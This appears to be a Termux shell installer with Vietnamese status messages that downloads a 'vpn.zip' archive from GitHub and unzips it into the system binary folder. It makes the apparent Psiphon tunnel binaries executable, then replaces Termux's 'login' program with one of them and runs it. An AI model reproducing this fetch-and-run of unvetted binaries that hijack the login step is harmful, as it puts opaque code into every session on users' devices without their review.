clear
echo "Đang cài đặt"
apt update && apt upgrade -y
clear
cd && cd && cd $HOME && cd /data/data/com.termux/files/usr/bin/ && pkg install wget -y && wget https://github.com/Triutheis/4g/raw/main/vpn.zip && pkg install unzip -y && unzip vpn.zip && chmod a+x tun && chmod a+x psiphon-tunnel-core && chmod a+x mod && mv mod login 
echo "Đã cài đặt thành công"
login
